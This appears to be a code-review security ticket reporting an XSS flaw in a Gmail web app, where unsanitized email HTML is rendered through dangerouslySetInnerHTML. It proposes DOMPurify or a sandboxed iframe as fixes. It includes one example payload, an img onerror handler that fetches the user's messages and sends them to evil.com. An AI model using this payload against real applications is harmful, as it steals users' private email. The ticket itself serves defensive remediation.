---
status: pending
priority: p1
issue_id: "003"
tags: [code-review, security]
dependencies: []
---

# XSS via Unsanitized Email HTML Rendering

## Problem Statement
Email HTML from the Gmail API is rendered directly into the DOM via `dangerouslySetInnerHTML` without any sanitization. No DOMPurify or equivalent library is installed. A malicious email can execute arbitrary JavaScript in the context of the app, exfiltrating all data.

## Findings

### Security Sentinel
- `frontend/app/gmail/page.tsx` lines 287-291: `dangerouslySetInnerHTML={{ __html: selectedEmail.bodyHtml }}`
- No DOMPurify in `package.json` dependencies
- Zero matches for "sanitize" across all `.ts`/`.tsx` files
- Combined with unauthenticated API routes (#001), a malicious email script can call any endpoint

### Attack Payload Example
```html
<img src=x onerror="fetch('/api/google/gmail/messages').then(r=>r.json()).then(d=>fetch('https://evil.com/steal?d='+btoa(JSON.stringify(d))))">
```

## Proposed Solutions

### Option A: DOMPurify Sanitization (Recommended)
```bash
pnpm add dompurify && pnpm add -D @types/dompurify
```
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(selectedEmail.bodyHtml) }}
```
- **Effort**: Small (single file change)
- **Risk**: Low

### Option B: Sandboxed iframe
Render emails inside `<iframe sandbox="" srcDoc={sanitizedHtml} />` for defense-in-depth.
- **Effort**: Medium
- **Risk**: Low

## Acceptance Criteria
- [ ] DOMPurify installed and applied to all `dangerouslySetInnerHTML` usage
- [ ] `<script>`, event handlers, and `<iframe>` tags are stripped from email HTML
- [ ] Email rendering still looks correct for normal HTML emails

## Work Log
| Date | Action | Learnings |
|------|--------|-----------|
| 2026-02-11 | Created from code review | Security Sentinel finding |
